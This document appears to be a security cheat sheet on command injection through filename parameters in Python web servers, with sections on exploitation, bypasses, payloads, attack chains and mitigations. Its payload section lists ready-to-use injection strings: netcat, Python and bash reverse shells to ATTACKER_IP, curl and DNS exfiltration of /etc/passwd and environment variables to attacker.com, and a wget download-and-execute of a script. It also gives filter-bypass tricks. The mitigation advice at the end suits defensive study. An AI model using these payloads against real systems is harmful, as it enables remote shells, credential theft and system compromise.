## 1. Overview

Python applications face several security challenges, particularly in web server implementations and code analysis. Understanding these vulnerabilities helps developers write more secure code and security professionals identify potential weaknesses.

**Key Risk Areas:**

- Input validation failures
- Command injection vulnerabilities
- Path traversal attacks
- Insecure code patterns

**Static Analysis Tool:**

- **Bandit** - Primary Python security analyzer
    - Repository: https://github.com/PyCQA/bandit
    - Purpose: Automated security issue detection in Python code
    - Use case: CI/CD integration and pre-deployment scanning

---

## 2. Exploitation Methods

### Input Injection in Web Servers

**Target:** Python web server filename parameters

**Attack Vector:** Command injection through unsanitized user input

**Step-by-Step Exploitation:**

1. **Identify Input Points**
    
    - Locate file upload handlers
    - Find filename processing functions
    - Check URL parameters accepting filenames
2. **Test Basic Injection**
    
    ```text
    "; cat /etc/passwd
    ```
    
3. **Validation Steps**
    
    - Submit malicious filename
    - Monitor server response
    - Check for command execution evidence
    - Verify data exfiltration
4. **Common Injection Points**
    
    - File upload forms
    - Document processing endpoints
    - File download parameters
    - Archive extraction functions

**Vulnerable Code Pattern:**

```python
# VULNERABLE - Don't use this!
filename = request.GET['filename']
os.system(f"cat {filename}")
```

---

## 3. Bypasses

### Command Separator Techniques

**Common Separators:**

- `;` - Sequential command execution
- `&&` - Conditional execution (if first succeeds)
- `||` - Alternative execution (if first fails)
- `|` - Pipe output to next command
- `\n` - Newline injection (in some contexts)

**Filter Bypass Strategies:**

**Whitespace Filtering:**

```text
${IFS} instead of space
$IFS$() alternative
<tab> character
```

**Quote Escaping:**

```text
""; command
''; command
`command`
$(command)
```

**Path Obfuscation:**

```text
/e??/pas?wd
/etc/pass*
/e\tc/passwd
```

---

## 4. Payloads

### Top 10 Modern & Robust Payloads

1. **Basic Command Chaining**
    
    ```text
    "; cat /etc/passwd
    ```
    
2. **Reverse Shell (Netcat)**
    
    ```text
    "; nc -e /bin/bash ATTACKER_IP 4444
    ```
    
3. **Python Reverse Shell**
    
    ```text
    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
    
4. **Data Exfiltration (DNS)**
    
    ```text
    "; nslookup $(whoami).attacker.com
    ```
    
5. **Curl Exfiltration**
    
    ```text
    "; curl -d @/etc/passwd https://attacker.com/collect
    ```
    
6. **Wget Download & Execute**
    
    ```text
    "; wget http://attacker.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh
    ```
    
7. **Bash Reverse Shell**
    
    ```text
    "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    ```
    
8. **Environment Variable Extraction**
    
    ```text
    "; env | curl -X POST -d @- https://attacker.com/env
    ```
    
9. **Process Enumeration**
    
    ```text
    "; ps aux | nc ATTACKER_IP 4444
    ```
    
10. **Privilege Escalation Check**
    
    ```text
    "; find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt
    ```
    

---

## 5. Higher Impact Scenarios

### Privilege Escalation Chain

**Scenario:** Web server running with elevated privileges

**Attack Path:**

1. Inject command via filename parameter
2. Enumerate SUID binaries
3. Exploit misconfigured sudo permissions
4. Achieve root access
5. Install persistent backdoor

**Impact:** Complete system compromise

---

### Data Breach via Automated Exfiltration

**Scenario:** Access to database credentials

**Attack Path:**

1. Execute command injection
2. Read application configuration files
3. Extract database credentials
4. Dump entire database
5. Exfiltrate via encrypted channel

**Impact:** Complete data exposure, compliance violations

---

### Lateral Movement

**Scenario:** Compromised web server in internal network

**Attack Path:**

1. Establish persistent access via injected command
2. Enumerate internal network topology
3. Extract SSH keys or credentials
4. Pivot to internal systems
5. Escalate throughout infrastructure

**Impact:** Network-wide compromise

---

### Supply Chain Attack

**Scenario:** Compromise build/deployment pipeline

**Attack Path:**

1. Inject malicious code via filename handling
2. Modify deployment scripts
3. Insert backdoor into production artifacts
4. Distribute compromised packages
5. Affect downstream users

**Impact:** Widespread compromise, reputation damage

---

## 6. Mitigations

### Input Validation & Sanitization

**Best Practices:**

✅ **Whitelist Approach**

```python
# SECURE - Whitelist allowed characters
import re
def safe_filename(filename):
    if re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
        return filename
    raise ValueError("Invalid filename")
```

✅ **Path Traversal Prevention**

```python
# SECURE - Validate against directory traversal
import os
from pathlib import Path

def safe_path(base_dir, filename):
    base = Path(base_dir).resolve()
    target = (base / filename).resolve()
    if not target.is_relative_to(base):
        raise ValueError("Path traversal detected")
    return target
```

---

### Command Execution Safety

**Never Use:**

- `os.system()`
- `os.popen()`
- `subprocess.call()` with `shell=True`
- `eval()` on user input
- `exec()` on user input

**Use Instead:**

```python
# SECURE - No shell interpretation
import subprocess

subprocess.run(['cat', safe_filename], 
               capture_output=True, 
               shell=False,  # Critical!
               timeout=5)
```

---

### Security Hardening Checklist

**Application Level:**

- [ ] Implement strict input validation
- [ ] Use parameterized queries
- [ ] Avoid shell invocation
- [ ] Apply principle of least privilege
- [ ] Enable comprehensive logging

**Infrastructure Level:**

- [ ] Run services as non-root users
- [ ] Implement SELinux/AppArmor policies
- [ ] Use containerization with restricted capabilities
- [ ] Apply network segmentation
- [ ] Enable WAF/RASP solutions

**Development Workflow:**

- [ ] Integrate Bandit in CI/CD pipeline
- [ ] Conduct regular security code reviews
- [ ] Implement dependency scanning
- [ ] Maintain updated security training
- [ ] Establish vulnerability disclosure process

---

### Monitoring & Detection

**Key Indicators of Compromise:**

- Unexpected system commands in web logs
- Unusual process spawning patterns
- Abnormal network connections
- File system modifications
- Privilege escalation attempts

**Detection Strategy:**

```python
# Example logging for audit trail
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def process_file(filename):
    logger.info(f"File request: {filename} from {request.remote_addr}")
    # Validate and process
```

---

## Pro Tips for Security Testing

🎯 **Quick Assessment Strategy:**

1. Run Bandit on codebase
2. Review all user input handling
3. Test filename parameters systematically
4. Verify command execution patterns
5. Document findings with reproducible steps

🚀 **Stay Ahead:**

- Keep Python and dependencies updated
- Subscribe to security advisories
- Practice defense in depth
- Test your defenses regularly

**Remember:** Every validation you add is a barrier against attackers! 🛡️